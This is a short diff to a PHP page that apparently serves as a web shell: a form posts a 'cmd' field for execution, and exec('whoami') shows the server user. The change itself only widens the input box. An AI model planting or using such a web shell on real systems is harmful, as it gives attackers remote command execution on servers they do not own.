@@ -29,7 +29,7 @@ if (isset($_POST['cmd'])) {
 <strong><?= exec('whoami') ?></strong>
 <form action="/" method="post">
     <div>
-        <input id="cmd" name="cmd" autocomplete="off" autofocus="autofocus" />
+        <input id="cmd" name="cmd" autocomplete="off" autofocus="autofocus" width="200px" size="100" />
         <button type="submit">exec</button>
     </div>
     <div>
